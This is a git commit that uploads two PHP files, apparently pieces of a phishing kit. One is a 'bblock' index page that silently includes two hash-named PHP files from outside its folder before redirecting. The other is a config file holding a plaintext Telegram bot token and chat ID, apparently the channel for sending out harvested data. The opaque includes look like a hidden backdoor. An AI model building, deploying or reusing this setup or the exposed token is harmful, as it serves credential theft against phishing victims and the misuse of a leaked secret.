de6b121ca0f2a226de9b1cf52eafb6e10c57ddce
bradfrohmy <bradbarker_c4@Outlook.com>
2025-02-07 15:26:41 -0800

    Add files via upload

---
+++ bblock/index.php
@@ -0,0 +1,3 @@
+<?php include_once'../../a31a61a2c65a873013f418504788eda0.php';?><?php include_once'../../f337fc1bc25c2abc2e482a870eeb2eb0.php';?><?php
+	exit(header("Location: ../index.php")); 
+?>
---
+++ config.php
@@ -0,0 +1,5 @@
+<?php
+
+$bot_token = "5068014314:AAGWgJKqLG9wWLzZj4m932uZrCh9drAE4YQ";
+$chat_id = "-1001698014638";
+?>
